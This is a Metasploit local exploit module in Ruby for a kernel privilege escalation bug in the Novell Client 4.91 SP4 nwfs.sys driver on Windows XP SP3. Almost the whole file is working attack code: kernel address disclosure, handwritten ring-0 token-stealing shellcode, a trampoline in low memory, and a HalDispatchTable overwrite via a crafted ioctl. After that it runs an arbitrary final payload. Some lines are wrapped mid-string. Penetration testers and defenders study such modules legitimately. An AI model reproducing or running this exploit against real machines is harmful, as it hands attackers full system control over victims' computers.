##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Exploit::Local
	Rank = AverageRanking

	include Msf::Post::Common
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super(update_info(info, {
			'Name'          => 'Novell Client 4.91 SP4 
nwfs.sys Local Privilege Escalation',
			'Description'    => %q{
				This module exploits a flaw in the 
nwfs.sys driver to overwrite data in kernel
				space. The corruption occurs while 
handling ioctl requests with code 0x1438BB,
				where a 0x00000009 dword is written to 
an arbitrary address. An entry within the
				HalDispatchTable is overwritten in order 
to execute arbitrary code when
				NtQueryIntervalProfile is called. The 
module has been tested successfully on
				Windows XP SP3 with Novell Client 4.91 
SP4.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Ruben Santamarta', # 
Vulnerability discovery and PoC
					'juan vazquez' # MSF module
				],
			'Arch'          => ARCH_X86,
			'Platform'      => 'win',
			'SessionTypes'  => [ 'meterpreter' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Targets'       =>
				[
					# Tested with nwfs.sys 4.91.4.7 
as installed with Novell Client 4.91 SP4
					[ 'Automatic', { } ],
					[ 'Windows XP SP3',
						{
							
'HaliQuerySystemInfo' => 0x16bba, # Stable over Windows XP SP3 updates
							'_KPROCESS' => 
"\x44", # Offset to _KPROCESS from a _ETHREAD struct
							'_TOKEN' => 
"\xc8",    # Offset to TOKEN from the _EPROCESS struct
							'_UPID' => 
"\x84",     # Offset to UniqueProcessId FROM the _EPROCESS struct
							'_APLINKS' => 
"\x88"   # Offset to ActiveProcessLinks _EPROCESS struct
						}
					]
				],
			'References'    =>
				[
					[ 'OSVDB', '46578' ],
					[ 'BID', '30001' ],
					[ 'URL', 
'http://support.novell.com/docs/Readmes/InfoDocument/patchbuilder/readme_5028543.html' 
]
				],
			'DisclosureDate'=> 'Jun 26 2008',
			'DefaultTarget' => 0
		}))

	end

	def add_railgun_functions
		session.railgun.add_function(
			'ntdll',
			'NtAllocateVirtualMemory',
			'DWORD',
			[
				["DWORD", "ProcessHandle", "in"],
				["PBLOB", "BaseAddress", "inout"],
				["PDWORD", "ZeroBits", "in"],
				["PBLOB", "RegionSize", "inout"],
				["DWORD", "AllocationType", "in"],
				["DWORD", "Protect", "in"]
			])

		session.railgun.add_function(
			'ntdll',
			'NtDeviceIoControlFile',
			'DWORD',
			[
				[ "DWORD", "FileHandle", "in" ],
				[ "DWORD", "Event", "in" ],
				[ "DWORD", "ApcRoutine", "in" ],
				[ "DWORD", "ApcContext", "in" ],
				[ "PDWORD", "IoStatusBlock", "out" ],
				[ "DWORD", "IoControlCode", "in" ],
				[ "LPVOID", "InputBuffer", "in" ],
				[ "DWORD", "InputBufferLength", "in" ],
				[ "LPVOID", "OutputBuffer", "in" ],
				[ "DWORD", "OutPutBufferLength", "in" ]
			])

		session.railgun.add_function(
			'ntdll',
			'NtQueryIntervalProfile',
			'DWORD',
			[
				[ "DWORD", "ProfileSource", "in" ],
				[ "PDWORD", "Interval", "out" ]
			])
		session.railgun.add_dll('psapi') if not 
session.railgun.dlls.keys.include?('psapi')
		session.railgun.add_function(
			'psapi',
			'EnumDeviceDrivers',
			'BOOL',
			[
				["PBLOB", "lpImageBase", "out"],
				["DWORD", "cb", "in"],
				["PDWORD", "lpcbNeeded", "out"]
			])
		session.railgun.add_function(
			'psapi',
			'GetDeviceDriverBaseNameA',
			'DWORD',
			[
				["LPVOID", "ImageBase", "in"],
				["PBLOB", "lpBaseName", "out"],
				["DWORD", "nSize", "in"]
			])
	end

	def open_device(dev)

		invalid_handle_value = 0xFFFFFFFF

		r = session.railgun.kernel32.CreateFileA(dev, 
"GENERIC_READ", 0x3, nil, "OPEN_EXISTING", "FILE_ATTRIBUTE_READONLY", 0)

		handle = r['return']

		if handle == invalid_handle_value
			return nil
		end

		return handle
	end

	def find_sys_base(drvname)
		results = session.railgun.psapi.EnumDeviceDrivers(4096, 
1024, 4)
		addresses = 
results['lpImageBase'][0..results['lpcbNeeded'] - 1].unpack("L*")

		addresses.each do |address|
			results = 
session.railgun.psapi.GetDeviceDriverBaseNameA(address, 48, 48)
			current_drvname = 
results['lpBaseName'][0..results['return'] - 1]
			if drvname == nil
				if 
current_drvname.downcase.include?('krnl')
					return [address, 
current_drvname]
				end
			elsif drvname == 
results['lpBaseName'][0..results['return'] - 1]
				return [address, current_drvname]
			end
		end

		return nil
	end

	def execute_shellcode(shell_addr)

		vprint_status("Creating the thread to execute the 
shellcode...")
		ret = session.railgun.kernel32.CreateThread(nil, 0, 
shell_addr, nil, "CREATE_SUSPENDED", nil)
		if ret['return'] < 1
			vprint_error("Unable to CreateThread")
			return nil
		end
		hthread = ret['return']

		vprint_status("Resuming the Thread...")
		ret = client.railgun.kernel32.ResumeThread(hthread)
		if ret['return'] < 1
			vprint_error("Unable to ResumeThread")
			return nil
		end

		return true
	end

	def ring0_shellcode(t)
		restore_ptrs =  "\x31\xc0"                                                
# xor eax, eax
		restore_ptrs << "\xb8" + [ 
@addresses["HaliQuerySystemInfo"] ].pack("L")  # mov eax, offset 
hal!HaliQuerySystemInformation
		restore_ptrs << "\xa3" + [ 
@addresses["halDispatchTable"] + 4 ].pack("L") # mov dword ptr 
[nt!HalDispatchTable+0x4], eax

		tokenstealing =  "\x52"                                                   
# push edx                         # Save edx on the stack
		tokenstealing << "\x53"                                                   
# push ebx                         # Save ebx on the stack
		tokenstealing << "\x33\xc0"                                               
# xor eax, eax                     # eax = 0
		tokenstealing << "\x64\x8b\x80\x24\x01\x00\x00"                           
# mov eax, dword ptr fs:[eax+124h] # Retrieve ETHREAD
		tokenstealing << "\x8b\x40" + t['_KPROCESS']                              
# mov eax, dword ptr [eax+44h]     # Retrieve _KPROCESS
		tokenstealing << "\x8b\xc8"                                               
# mov ecx, eax
		tokenstealing << "\x8b\x98" + t['_TOKEN'] + 
"\x00\x00\x00"                # mov ebx, dword ptr [eax+0C8h]    # 
Retrieves TOKEN
		tokenstealing << "\x8b\x80" + t['_APLINKS'] + 
"\x00\x00\x00"              # mov eax, dword ptr [eax+88h]  <====| # 
Retrieve FLINK from ActiveProcessLinks
		tokenstealing << "\x81\xe8" + t['_APLINKS'] + 
"\x00\x00\x00"              # sub eax,88h                        | # 
Retrieve _EPROCESS Pointer from the ActiveProcessLinks
		tokenstealing << "\x81\xb8" + t['_UPID'] + 
"\x00\x00\x00\x04\x00\x00\x00" # cmp dword ptr [eax+84h], 4         | # 
Compares UniqueProcessId with 4 (The System Process on Windows XP)
		tokenstealing << "\x75\xe8"                                               
# jne 0000101e ======================
		tokenstealing << "\x8b\x90" + t['_TOKEN'] + 
"\x00\x00\x00"                # mov edx,dword ptr [eax+0C8h]     # 
Retrieves TOKEN and stores on EDX
		tokenstealing << "\x8b\xc1"                                               
# mov eax, ecx                     # Retrieves KPROCESS stored on ECX
		tokenstealing << "\x89\x90" + t['_TOKEN'] + 
"\x00\x00\x00"                # mov dword ptr [eax+0C8h],edx     # 
Overwrites the TOKEN for the current KPROCESS
		tokenstealing << "\x5b"                                                   
# pop ebx                          # Restores ebx
		tokenstealing << "\x5a"                                                   
# pop edx                          # Restores edx
		tokenstealing << "\xc2\x10"                                               
# ret 10h                          # Away from the kernel!

		ring0_shellcode = restore_ptrs + tokenstealing
		return ring0_shellcode
	end

	def fill_memory(proc, address, length, content)

		result = 
session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ address ].pack("L"), 
nil, [ length ].pack("L"), "MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN", 
"PAGE_EXECUTE_READWRITE")

		if not proc.memory.writable?(address)
			vprint_error("Failed to allocate memory")
			return nil
		else
			vprint_good("#{address} is now writable")
		end

		result = proc.memory.write(address, content)

		if result.nil?
			vprint_error("Failed to write contents to 
memory")
			return nil
		else
			vprint_good("Contents successfully written to 
0x#{address.to_s(16)}")
		end

		return address
	end

	def disclose_addresses(t)
		addresses = {}

		vprint_status("Getting the Kernel module name...")
		kernel_info = find_sys_base(nil)
		if kernel_info.nil?
			vprint_error("Failed to disclose the Kernel 
module name")
			return nil
		end
		vprint_good("Kernel module found: #{kernel_info[1]}")

		vprint_status("Getting a Kernel handle...")
		kernel32_handle = 
session.railgun.kernel32.LoadLibraryExA(kernel_info[1], 0, 1)
		kernel32_handle = kernel32_handle['return']
		if kernel32_handle == 0
			vprint_error("Failed to get a Kernel handle")
			return nil
		end
		vprint_good("Kernel handle acquired")


		vprint_status("Disclosing the HalDispatchTable...")
		hal_dispatch_table = 
session.railgun.kernel32.GetProcAddress(kernel32_handle, 
"HalDispatchTable")
		hal_dispatch_table = hal_dispatch_table['return']
		if hal_dispatch_table == 0
			vprint_error("Failed to disclose the 
HalDispatchTable")
			return nil
		end
		hal_dispatch_table -= kernel32_handle
		hal_dispatch_table += kernel_info[0]
		addresses["halDispatchTable"] = hal_dispatch_table
		vprint_good("HalDispatchTable found at 
0x#{addresses["halDispatchTable"].to_s(16)}")

		vprint_status("Getting the hal.dll Base Address...")
		hal_info = find_sys_base("hal.dll")
		if hal_info.nil?
			vprint_error("Failed to disclose hal.dll Base 
Address")
			return nil
		end
		hal_base = hal_info[0]
		vprint_good("hal.dll Base Address disclosed at 
0x#{hal_base.to_s(16)}")

		hali_query_system_information = hal_base + 
t['HaliQuerySystemInfo']
		addresses["HaliQuerySystemInfo"] = 
hali_query_system_information

		vprint_good("HaliQuerySystemInfo Address disclosed at 
0x#{addresses["HaliQuerySystemInfo"].to_s(16)}")
		return addresses
	end


	def exploit

		vprint_status("Adding the railgun stuff...")
		add_railgun_functions

		if sysinfo["Architecture"] =~ /wow64/i
			fail_with(Exploit::Failure::NoTarget, "Running 
against WOW64 is not supported")
		elsif sysinfo["Architecture"] =~ /x64/
			fail_with(Exploit::Failure::NoTarget, "Running 
against 64-bit systems is not supported")
		end

		my_target = nil
		if target.name =~ /Automatic/
			print_status("Detecting the target system...")
			os = sysinfo["OS"]
			print_status("#{os.inspect}")
			if os =~ /windows xp/i
				my_target = targets[1]
				print_status("Running against 
#{my_target.name}")
			end
		else
			my_target = target
		end

		if my_target.nil?
			fail_with(Exploit::Failure::NoTarget, "Remote 
system not detected as target, select the target manually")
		end

		print_status("Checking device...")
		handle = open_device("\\\\.\\nwfs")
		if handle.nil?
			fail_with(Exploit::Failure::NoTarget, 
"\\\\.\\nwfs device not found")
		else
			print_good("\\\\.\\nwfs found!")
		end

		print_status("Disclosing the HalDispatchTable and 
hal!HaliQuerySystemInfo addresses...")
		@addresses = disclose_addresses(my_target)
		if @addresses.nil?
			session.railgun.kernel32.CloseHandle(handle)
			fail_with(Exploit::Failure::Unknown, "Filed to 
disclose necessary addresses for exploitation. Aborting.")
		else
			print_good("Addresses successfully disclosed.")
		end


		print_status("Storing the kernel stager on memory...")
		this_proc = session.sys.process.open
		kernel_shell = ring0_shellcode(my_target)
		kernel_shell_address = 0x1000
		result = fill_memory(this_proc, kernel_shell_address, 
0x1000, kernel_shell)
		if result.nil?
			session.railgun.kernel32.CloseHandle(handle)
			fail_with(Exploit::Failure::Unknown, "Error 
while storing the kernel stager shellcode on memory")
		else
			print_good("Kernel stager successfully stored at 
0x#{kernel_shell_address.to_s(16)}")
		end

		print_status("Storing the trampoline to the kernel 
stager on memory...")
		trampoline = "\x90" * 0x20       # nops
		trampoline << "\x68"             # push opcode
		trampoline << [0x1000].pack("V") # address to push
		trampoline << "\xc3"             # ret
		trampoline_addr = 0x3
		result = fill_memory(this_proc, trampoline_addr, 0x1000, 
trampoline)
		if result.nil?
			session.railgun.kernel32.CloseHandle(handle)
			fail_with(Exploit::Failure::Unknown, "Error 
while storing trampoline on memory")
		else
			print_good("Trampoline successfully stored at 
0x#{trampoline_addr.to_s(16)}")
		end

		print_status("Triggering the vulnerability, corrupting 
the HalDispatchTable...")
		magic_ioctl = 0x1438BB
		ioctl = 
session.railgun.ntdll.NtDeviceIoControlFile(handle, 0, 0, 0, 4, 
magic_ioctl, @addresses["halDispatchTable"] + 0x4, 0x10, 0, 0)
		session.railgun.kernel32.CloseHandle(handle)

		print_status("Executing the Kernel Stager throw 
NtQueryIntervalProfile()...")
		result = 
session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)

		print_status("Checking privileges after 
exploitation...")

		if not is_system?
			fail_with(Exploit::Failure::Unknown, "The 
exploitation wasn't successful")
		else
			print_good("Exploitation successful!")
		end

		print_status("Storing the final payload on memory...")
		shell_address = 0x0c0c0000
		result = fill_memory(this_proc, shell_address, 0x1000, 
payload.encoded)
		if result.nil?
			fail_with(Exploit::Failure::Unknown, "Error 
while storing the final payload on memory")
		else
			print_good("Final payload successfully stored at 
0x#{shell_address.to_s(16)}")
		end

		print_status("Executing the payload...")
		result = execute_shellcode(shell_address)
		if result.nil?
			fail_with(Exploit::Failure::Unknown, "Error 
while executing the payload")
		else
			print_good("Enjoy!")
		end

	end

end


